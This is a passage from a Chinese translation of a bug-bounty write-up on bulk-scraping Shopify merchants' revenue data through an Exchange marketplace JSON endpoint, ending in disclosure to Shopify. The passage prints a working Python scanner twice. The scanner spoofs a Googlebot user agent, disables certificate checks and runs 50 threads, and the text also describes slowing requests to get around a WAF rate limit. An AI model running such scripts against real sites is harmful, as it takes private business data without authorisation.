            source = requests.get("https://" + shops).text
            soup = bs.BeautifulSoup(source, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if 'window.Shopify.Checkout.apiHost' in script.text:
                    index1 = script.text.index('"')
                    index2 = script.text.index('myshopify')
                    StoreName = script.text[index1 + 1:index2 - 2]
                    with open('shops.txt', 'a') as output:
                        output.write(StoreName + "\n")
        except BaseException:
            pass
    def almostvuln(StoreName):
        POC_URL = "https://exchangemarketplace.com/shops/{}/revenue_data.json".format(
            StoreName)
        try:
            _Response = requests.get(
                POC_URL,
                headers=_headers,
                verify=False,
                allow_redirects=True)
            if _Response.status_code in [200, 304]:
                vuln_stores.append(StoreName)
                print(StoreName)
            elif _Response.status_code == 404:
                pass
            else:
                print(_Response.status_code)
        except BaseException:
            pass
        return vuln_stores
    if __name__ == '__main__':
        try:
            shops = [line.rstrip('\n') for line in open('wordlist.txt')]
            with ThreadPoolExecutor(max_workers=50) as executor:
                executor.map(myshopify, shops)
            vuln_stores = [line.rstrip('\n') for line in open('shops.txt')]
            with ThreadPoolExecutor(max_workers=50) as executor1:
                executor1.map(almostvuln, vuln_stores)
        except KeyboardInterrupt:
            print("")
运行后的结果
WTF？  
因此，在1000家商店中，我只能识别出四家商店有问题，其中三家在交易市场上市，因此预计他们的销售数据会公开的，一家商店已经被停用了（这么Lucky的吗，嗯？）
因此，我认为这玩意没有任何安全影响，我停止了几周的测试（比较忙），并决定过阵子回来探索更多的可能性并继续挖掘。
一千年以后......
几周之后，我又回到了上面提到的API请求并开始继续研究它。我无法从中获取任何有用的信息，因此我决定采用不同的方法来解决这个问题。
为了获得更多要分析的数据，我们将从1000个商店的测试切换到更大的样本（数千，数百万），下一节将详细介绍新方法。
## 新的思路
怎么找到所有现有Shopify商店的最佳方式？
我想到的第一件事是扫描互联网，但是当我们有其他数据时，就可以不用这么麻烦。
对于这项特定的研究，我将使用公共的DNS转发数据。使用此方法，我们不需要从给定的域名列表生成商店名称。相反，我们将使用`FDNS`获取shops.myshopify.com（所有商店的指向）的反向CNAME记录  
ps：FDNS就是DNS转发  
我使用了一个规格很大的实例然后下载了这项研究所需要的数据。
现在，我们将寻找与shops.myshopify.com匹配的CNAME记录，其中Shopify正在托管他们的商店。
在检查有多少商店可用时，我发现：
完美！
此时，我们已经完成了wordlist，继续使用前面的exploit.py。
## Exploit
    import json
    import requests
    import bs4 as bs
    from concurrent.futures import ThreadPoolExecutor
    from concurrent.futures import ProcessPoolExecutor
    try:
        import requests.packages.urllib3
        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass
    _headers = {
        'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    def myshopify(shops):
        try:
            source = requests.get("https://" + shops).text
            soup = bs.BeautifulSoup(source, 'html.parser')
            scripts = soup.find_all('script')
            for script in scripts:
                if 'window.Shopify.Checkout.apiHost' in script.text:
                    index1 = script.text.index('"')
                    index2 = script.text.index('myshopify')
                    StoreName = script.text[index1 + 1:index2 - 2]
                    with open('shops.txt', 'a') as output:
                        output.write(StoreName + "\n")
        except BaseException:
            pass
    def almostvuln(StoreName):
        POC_URL = "https://exchangemarketplace.com/shops/{}/revenue_data.json".format(
            StoreName)
        try:
            _Response = requests.get(
                POC_URL,
                headers=_headers,
                verify=False,
                allow_redirects=True)
            if _Response.status_code in [200, 304]:
                vuln_stores.append(StoreName)
                print(StoreName)
            elif _Response.status_code == 404:
                pass
            else:
                print(_Response.status_code)
        except BaseException:
            pass
        return vuln_stores
    if __name__ == '__main__':
        try:
            shops = [line.rstrip('\n') for line in open('wordlist.txt')]
            with ThreadPoolExecutor(max_workers=50) as executor:
                executor.map(myshopify, shops)
            vuln_stores = [line.rstrip('\n') for line in open('shops.txt')]
            with ThreadPoolExecutor(max_workers=50) as executor1:
                executor1.map(almostvuln, vuln_stores)
        except KeyboardInterrupt:
            print("")
然后放到VPS上，因为wordlist比较大，我可不想傻傻的等，我也要睡觉的.
大约一个小时试着睡觉......
这个图比较真实...
我放弃了睡觉的想法并立即打开我的电脑，登录到我的vps，我看到的是数以千计的403错误.
我猜测应该是被ban ip了  
有WAF.....
不管了,先去睡觉.
然后我又写了一个脚本来测试.
这基本上将800K家商店名称作为输入（stores-exchange.txt），发送到curl请求以检索销售数据，在将数据打印到stdout之前,将使用DAP库在同一个JSON响应中插入商店名称。
这次我们的脚本会很慢，因为你知道bash是单线程的，这是我们可以绕过速率限制策略的唯一方法，我运行脚本并从我的实例中注销...
几天后，我重新登录我的实例检查结果，look:
我们获取了Shopify商家的销售数据，其中包括从2015年到今天每月数千家商店的收入细节。
我们有存在漏洞的商店名单，所以如果我们像查询谁的话,我可以看到他所有的收入细节.  
这是Shopify商家从2015年至今的销售数据。  
根据CVSS 3.0，这次的发现的得分为7.5-high，这反映了漏洞，客户流量和收入数据的重要性，这其中并不需要任何特权或用户交互来获取信息。  
## 根本原因分析
基于以上数据和几天的研究，我得出的结论是，这是由`Shopify Exchange
App`(现在是由商家主动去使用）引起的，这个应用程序仅在此漏洞出现前几个月才推出。任何安装了Exchange App的商家都会受到这个攻击。
之后，我迅速将所有信息和数据汇总到报告中，提交给Shopify 的bug bounty.
Wing碎碎念:在提交漏洞过程中,这个作者和Shopify 好像有点争执,可能是因为违反了他们的规定,结果是好的就行,渗透道路千万条,安全法规心中记.
最后,感谢Shopify团队，特别感谢Peter
Yaworski,非常乐于助人和支持我。我仍然强烈建议他们继续对程序进行安全测试，因为他们处理漏洞报告的速度很快.
[原文链接](https://medium.com/@ayoubfathi/how-i-gained-access-to-revenue-and-traffic-data-of-thousands-of-shopify-stores-b6fe360cc369)